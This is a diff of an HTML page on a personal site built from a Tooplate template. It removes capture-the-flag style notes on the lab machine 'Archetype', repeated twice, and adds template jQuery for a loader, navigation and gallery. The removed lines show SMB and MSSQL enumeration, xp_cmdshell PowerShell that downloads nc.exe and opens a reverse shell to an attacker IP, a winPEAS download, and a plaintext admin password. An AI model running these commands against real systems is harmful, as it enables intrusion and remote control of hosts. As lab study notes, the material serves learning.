@@ -10,29 +10,27 @@
     <link rel="stylesheet" href="../css/tooplate-vertex.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github-dark-dimmed.min.css">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
-<!--
-
-Tooplate 2124 Vertex
-
-https://www.tooplate.com/view/2124-vertex
-
--->
-
 </head>
 <body>
+    <div id="loader-wrapper">
+        <div id="loader"></div>
 
+        <div class="loader-section section-left"></div>
+        <div class="loader-section section-right"></div>
+
+    </div>
     <!-- Nav -->
     <nav class="tm-nav">                               
                 <a href="../index.html" class="nav-link1 ">
                     Volver
     </nav>
-
+    <main>
         <div id="intro" class="tm-section">
             <!-- Intro left -->
             <div class="tm-section-col tm-content">
-                <div class="tm-media ">
+                <div class="tm-media-center ">
                     <div class="tm-media-body">
-                        <h2><a href="folder/test.html" class="tm-text-primary">ARCHETYPE</a></h2>
+                        <h2><a href="folder/test.html" class="tm-text-primary">SIUUUUUUUUUUUU</a></h2>
                         <p class="tm-mb-20 tm-text-small">
                             This is a Responsive HTML5 Template brought to you by Tooplate for
                             100% free of charge. You can feel free to download, modify, and
@@ -58,55 +56,6 @@ https://www.tooplate.com/view/2124-vertex
                             This is a Responsive HTML5 Template brought to you by Tooplate for
                             100% free of charge. You can feel free to download, modify, and
                             use this layout for your websites.
-                            
-                            <pre class="align-center">
-                                <code class="language-bash">
-                                    function name() {
-                                        console.log("output")
-                                      }
-nmap -p 1-10000 -sV 10.129.95.187
-smbclient -L 10.129.95.187
-smbclient //10.129.95.187/(nombre de grupo)backups
-get prod.dtsConfig
-cat prod.dtsConfig
-/usr/bin/impacket-mssqlclient ARCHETYPE/sql_svc@10.129.95.187 - windows-auth
--
-sudo python -m http.server 80 = activar servidor http
-nc -lvnp 4444= activar netcat con el puerto respectivo y especificando
--
-xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget  http://10.10.14.173/nc.exe -outfile nc.exe" 
-
-xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nv.exe -e cmd.exe 10.10.14.173 4444"
-wget http://10.10.14.173/winPEASx64.exe -outfile winpeas.exe
-administrator MEGACORP_4dm1n!!
-
-                             
-                                </code>
-                            </pre>
-                            <pre class="align-center">
-                                <code class="language-bash">
-                                    function name() {
-                                        console.log("output")
-                                      }
-nmap -p 1-10000 -sV 10.129.95.187
-smbclient -L 10.129.95.187
-smbclient //10.129.95.187/(nombre de grupo)backups
-get prod.dtsConfig
-cat prod.dtsConfig
-/usr/bin/impacket-mssqlclient ARCHETYPE/sql_svc@10.129.95.187 - windows-auth
--
-sudo python -m http.server 80 = activar servidor http
-nc -lvnp 4444= activar netcat con el puerto respectivo y especificando
--
-xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget  http://10.10.14.173/nc.exe -outfile nc.exe" 
-
-xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nv.exe -e cmd.exe 10.10.14.173 4444"
-wget http://10.10.14.173/winPEASx64.exe -outfile winpeas.exe
-administrator MEGACORP_4dm1n!!
-
-                             
-                                </code>
-                            </pre>
                             <img src="../img/captures/ARCHETYPE1.png" width="540" height="200">
                         </p>
                         <hr class="tm-hr tm-mr">
@@ -114,8 +63,9 @@ administrator MEGACORP_4dm1n!!
                 </div> 
                 
             </div>  
-            
-        </div>               
+            <div class="tm-section-col tm-parallax" data-parallax="scroll" data-image-src="../img/hano1.jpg"></div>
+        </div>   
+    </main>                
 </body>
  <script src="https://code.iconify.design/iconify-icon/1.0.7/iconify-icon.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/languages/go.min.js"></script>
@@ -124,42 +74,102 @@ administrator MEGACORP_4dm1n!!
  
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlightjs-themes@1.0.0/androidstudio.css" />
  
+ <script src="../js/plugins.js"></script>
  <script>
-     hljs.highlightAll(); // initialize highlighting
- </script>
- 
- <!-- Code to append a click to copy button -->
- <script>
-     var snippets = document.getElementsByTagName('pre');
-     var numberOfSnippets = snippets.length;
-     for (var i = 0; i < numberOfSnippets; i++) {
-         code = snippets[i].getElementsByTagName('code')[0].innerText;
- 
-         snippets[i].classList.add('hljs'); // append copy button to pre tag
- 
-         snippets[i].innerHTML = '<button class="hljs-copy">Copy</button>' + snippets[i].innerHTML; // append copy button
- 
-         snippets[i].getElementsByClassName('hljs-copy')[0].addEventListener("click", function () {
-             this.innerText = 'Copying..';
-             if (!navigator.userAgent.toLowerCase().includes('safari')) {
-                 navigator.clipboard.writeText(code);
-             } else {
-                 prompt("Clipboard (Select: ⌘+a > Copy:⌘+c)", code);
-             }
-             this.innerText = 'Copied!';
-             button = this;
-             setTimeout(function () {
-                 button.innerText = 'Copy';
-             }, 1000)
+     $(window).on("load", function() {
+         $('body').addClass('loaded');
+     });
+
+     $(function(){
+         
+         /*************** Navigation *****************/
+
+         const tmMainNav = $("#tm-main-nav");
+
+         tmMainNav.singlePageNav({
+             filter: ':not(.external)'
          });
-     }
+
+         $('.navbar-toggler').click(function(e) {
+             e.stopPropagation();
+             tmMainNav.toggleClass('show');
+         });
+
+         $("html").click(function(e) {
+             $("#tm-main-nav").removeClass("show");
+         });
+
+         /****************** Smooth Scrolling *****************/
+
+         $(".tm-btn-next").on('click', function(event) {
+             if (this.hash !== "") {
+                 event.preventDefault();
+                 var hash = this.hash;
+
+                 $('html, body').animate({
+                     scrollTop: $(hash).offset().top
+                 }, 800, function(){
+                     // window.location.hash = hash;
+                 });
+             }
+         });
+
+         $('.tm-brand-icon').on('click', function(event) {
+             $('html, body').animate({
+                     scrollTop: $('#intro').offset().top
+                 }, 800);
+         });
+
+         /****************** Gallery ******************/
+
+         const galleryItems = document.querySelector(".tm-gallery").children;
+         const itemsPerPage = 10;
+         const totalPages = Math.ceil(galleryItems.length / itemsPerPage);
+         const pageAttribute = 'data-page';
+
+         function setPagination(currentPage) {
+             for(let i = 1; i <= totalPages; i++) {
+                 var $pager = '';
+                 
+                 if(currentPage == i) {
+                     $pager = $('<a href="javascript:void(0);" class="active tm-paging-link" '+pageAttribute+'="'+i+'"></a>');
+                 } else {
+                     $pager = $('<a href="javascript:void(0);" class="tm-paging-link" '+pageAttribute+'="'+i+'"></a>');
+                 }
+
+                 $pager.html(i);
+
+                 $pager.click(function(){ 
+                     $('.tm-paging-link').removeClass("active");
+                     $(this).addClass('active');
+                     var page = $(this).eq(0).attr(pageAttribute);
+                     showItems(page);
+                 });
+
+                 $pager.appendTo($('.tm-paging'));
+             }
+         }
+
+         function showItems(currentPage) {
+             for(let i = 0; i < galleryItems.length; i++) {
+                 galleryItems[i].classList.remove("show");
+                 galleryItems[i].classList.add("hide");
+
+                 if(i >= (currentPage * itemsPerPage) - itemsPerPage && i < currentPage * itemsPerPage) {
+                     galleryItems[i].classList.remove("hide");
+                     galleryItems[i].classList.add("show");
+                 }
+             }
+         }
+
+         setPagination(1);
+         showItems(1);
+
+         /****************** Magnific Popup ***********/
+
+
+     });
  </script>
- <style>
-     .hljs-copy {
-         float: right;
-         cursor: pointer;
-     }
- </style>
 
 
 </html>
